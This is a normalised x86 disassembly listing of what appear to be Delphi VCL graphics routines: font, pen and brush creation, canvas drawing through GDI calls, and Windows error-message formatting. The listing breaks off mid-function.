mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4040dc
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_408454
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_4040dc
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_408454
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4040dc
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407c1c
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_41c854
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_41c718
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_41c2d4
mov edx esp
mov eax ebx
call sub_41c50c
add esp 0x2c
pop esi
pop ebx
retn
sub_41c744
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41c4f4
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41c50c
add esp 0x2c
pop esi
pop ebx
retn
sub_41c784
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41c4f4
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402b3c
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404114
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402a2c
mov edx esp
mov eax ebx
call sub_41c50c
sub_41c7fc
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call sub_405fa4
mov edx eax
neg edx
mov eax ebx
call sub_41c744
pop esi
pop ebx
retn
sub_41c828
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41c4f4
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41c50c
add esp 0x30
pop ebx
retn
sub_41c85c
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41c4f4
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_41c50c
add esp 0x2c
pop esi
pop ebx
retn
sub_41c88c
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41c4f4
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_41c50c
add esp 0x2c
pop esi
pop ebx
retn
sub_41c8b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41b8cc
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_41c8f8
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41b9b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_41c920
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413e74
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c0e0
xor eax eax
push ebp
push sub_41c9bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c0e0
xor eax eax
push ebp
push sub_41c9a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41bad8
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41cb28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c9a9
mov eax [ ebp - 0x8 ]
call sub_41c0f0
retn
sub_41c9d8
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41c9f0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c0e0
xor eax eax
push ebp
push sub_41ca35
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41ba60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ca3c
mov eax [ ebp - 0x4 ]
call sub_41c0f0
retn
sub_41ca48
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41c9d8
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41c9f0
add esp 0x10
pop esi
pop ebx
retn
sub_41ca70
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41b8b4
xor eax eax
push ebp
push sub_41caf6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41b8c0
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41c09c
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_41cb08
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] edx
mov edx esp
call sub_41c9f0
add esp 0x10
pop edi
pop esi
retn
sub_41cb44
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41c9d8
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_41c9f0
add esp 0x10
pop esi
pop ebx
retn
sub_41cb74
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41c9d8
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_41c9f0
sub_41cba0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41b8cc
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_41cbe0
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41b9b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_41cc08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413e74
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c0e0
xor eax eax
push ebp
push sub_41cc98
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c0e0
xor eax eax
push ebp
push sub_41cc7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41bad8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cc82
mov eax [ ebp - 0x8 ]
call sub_41c0f0
retn
sub_41ccb0
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_41cccc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c0e0
xor eax eax
push ebp
push sub_41cd11
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41ba60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cd18
mov eax [ ebp - 0x4 ]
call sub_41c0f0
retn
sub_41cd1c
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_41cccc
add esp 0x10
pop edi
pop esi
retn
sub_41cd48
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41ccb0
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_41cccc
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_41cd7c
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41b8b4
xor edx edx
push ebp
push sub_41ce49
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41b8c0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41c09c
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_41ce64
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41ccb0
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_41cccc
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_41ce98
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c388
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41d6e8
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c8b4
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41d708
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cba0
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41d728
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_413b9c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_41cf5c
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_413c38
xor edx edx
mov eax esi
call sub_41d520
mov eax [ esi + 0xc ]
call sub_403128
mov eax [ esi + 0x10 ]
call sub_403128
mov eax [ esi + 0x14 ]
call sub_403128
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413e48
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_41cfb8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d574
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41d574
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41d040
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d574
mov eax [ ebx + 0x14 ]
call sub_41cd40
call sub_41c09c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c09c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_412484
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d0ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d574
push esi
mov eax [ ebx + 0x4 ]
push eax
call DrawFocusRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41d120
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d574
mov eax [ ebx + 0x14 ]
call sub_41cd7c
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41d15c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d574
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41d1bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d574
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_41d1e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d574
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41d230
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d574
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d26c
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_41d4a0
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_41d298
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d574
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_404138
push eax
mov eax edi
call sub_404338
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_41d2dc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41d298
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41d2f8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41d298
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41d318
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41d364
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d36b
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_41d194
sub_41d3c4
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d574
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_41d3e8
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_41d1bc
pop ecx
pop edx
pop edi
pop esi
retn
sub_41d408
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d574
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_41d434
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d574
mov eax [ ebp + 0x8 ]
call sub_41c09c
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41d47c
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d574
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetClipBox
pop esi
pop ebx
retn
sub_41d4c0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_41d520
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_41d4c0
mov edx esp
mov eax ebx
call sub_41d3c4
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_41d3e8
sub_41d574
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_41d610
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
test bl 0x8
je r-xdata
mov eax esi
call sub_41d63c
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_41d66c
sub_41d610
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_41c570
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c09c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_41d63c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41ca70
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_41d66c
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_41cd7c
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_41cd7c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_41ce5c
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_41cd40
call sub_41c09c
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_41cd40
call sub_41c09c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_41d79c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41d7e6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d7ed
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_41d7f0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_41d88c
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_41d79c
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_4040e8
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d893
lea eax [ ebp - 0x104 ]
call sub_403e78
retn
sub_41d8a8
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_41d9f6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_41d965
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
